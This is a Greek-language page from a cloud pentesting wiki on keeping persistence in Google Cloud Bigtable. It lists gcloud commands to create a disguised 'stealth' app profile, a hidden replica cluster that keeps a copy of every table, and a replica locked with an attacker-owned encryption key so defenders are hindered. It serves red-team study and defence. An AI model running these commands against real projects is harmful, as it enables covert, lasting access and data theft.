# GCP - Bigtable Διατήρηση

{{#include ../../../banners/hacktricks-training.md}}

## Bigtable

Για περισσότερες πληροφορίες σχετικά με το Bigtable δείτε:

{{#ref}}
../gcp-services/gcp-bigtable-enum.md
{{#endref}}

### Αφιερωμένο attacker App Profile

**Δικαιώματα:** `bigtable.appProfiles.create`, `bigtable.appProfiles.update`.

Δημιουργήστε ένα app profile που δρομολογεί την κίνηση στο replica cluster σας και ενεργοποιήστε το Data Boost ώστε να μην εξαρτάστε ποτέ από provisioned nodes που μπορεί να παρατηρήσουν οι defenders.

<details>

<summary>Δημιουργήστε stealth app profile</summary>
```bash
gcloud bigtable app-profiles create stealth-profile \
--instance=<instance-id> --route-any --restrict-to=<attacker-cluster> \
--row-affinity --description="internal batch"

gcloud bigtable app-profiles update stealth-profile \
--instance=<instance-id> --data-boost \
--data-boost-compute-billing-owner=HOST_PAYS
```
</details>

Όσο αυτό το προφίλ υπάρχει, μπορείτε να επανασυνδεθείτε χρησιμοποιώντας νέα διαπιστευτήρια που το αναφέρουν.

### Διατήρηση του δικού σας replica cluster

**Δικαιώματα:** `bigtable.clusters.create`, `bigtable.instances.update`, `bigtable.clusters.list`.

Δημιουργήστε ένα cluster με ελάχιστο αριθμό κόμβων σε μια περιοχή με χαμηλή δραστηριότητα. Ακόμη κι αν οι ταυτότητες των clients σας εξαφανιστούν, **το cluster διατηρεί ένα πλήρες αντίγραφο κάθε πίνακα** μέχρι να το αφαιρέσουν ρητά οι αμυνόμενοι.

<details>

<summary>Δημιουργία replica cluster</summary>
```bash
gcloud bigtable clusters create dark-clone \
--instance=<instance-id> --zone=us-west4-b --num-nodes=1
```
</details>

Παρακολούθησέ το μέσω `gcloud bigtable clusters describe dark-clone --instance=<instance-id>` ώστε να μπορείς να κλιμακώσεις άμεσα όταν χρειαστεί να τραβήξεις δεδομένα.

### Κλείδωσε την αναπαραγωγή πίσω από το δικό σου CMEK

**Δικαιώματα:** `bigtable.clusters.create`, `cloudkms.cryptoKeyVersions.useToEncrypt` στο attacker-owned key.

Χρησιμοποίησε το δικό σου KMS key όταν δημιουργείς ένα clone. Χωρίς αυτό το key, Google δεν μπορεί να επαναδημιουργήσει ή να κάνει fail over το cluster, οπότε οι blue teams πρέπει να συντονιστούν μαζί σου πριν το πειράξουν.

<details>

<summary>Δημιουργία cluster προστατευμένου με CMEK</summary>
```bash
gcloud bigtable clusters create cmek-clone \
--instance=<instance-id> --zone=us-east4-b --num-nodes=1 \
--kms-key=projects/<attacker-proj>/locations/<kms-location>/keyRings/<ring>/cryptoKeys/<key>
```
</details>

Περιστρέψτε ή απενεργοποιήστε το κλειδί στο project σας για να αχρηστεύσετε άμεσα τη replica (ενώ μπορείτε να την ενεργοποιήσετε ξανά αργότερα).

{{#include ../../../banners/hacktricks-training.md}}
